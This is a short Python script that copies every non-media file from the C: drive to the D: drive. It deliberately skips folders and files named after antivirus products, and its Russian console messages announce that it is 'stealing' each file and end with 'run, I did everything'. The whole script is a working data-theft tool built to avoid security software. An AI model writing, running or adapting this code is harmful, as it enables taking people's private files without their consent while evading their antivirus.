import os
import shutil
import sys 

source_dir = "C:/"
dest_dir = "D:/"

skip_extensions = ['.jpg', '.jpeg', '.png', '.gif', 
                   '.mp3', '.wav', '.flac', 
                   '.mp4', '.mkv', '.avi', '.mov']

antivirus_keywords = ['antivirus', 'av', 'kaspersky', 
                      'mcafee', 'bitdefender', 'norton', 
                      'eset', 'sophos', 'defender']

for root, dirs, files in os.walk(source_dir):
    if 'NVIDIA' in root or any(keyword in root.lower() for keyword in antivirus_keywords):
        continue

    for file in files:
        if any(keyword in file.lower() for keyword in antivirus_keywords):
            continue

        _, ext = os.path.splitext(file)
        if ext.lower() not in skip_extensions:
            file_path = os.path.join(root, file)
            try:
                print(f"Ворую файл: {file_path}")  
                shutil.copy(file_path, dest_dir)
            except (PermissionError, FileNotFoundError) as e:
                print(f"Ошибка при краже {file_path}: {e}")   

print("БЕГИ, Я ВСЁ СДЕЛАЛ!")
sys.exit()

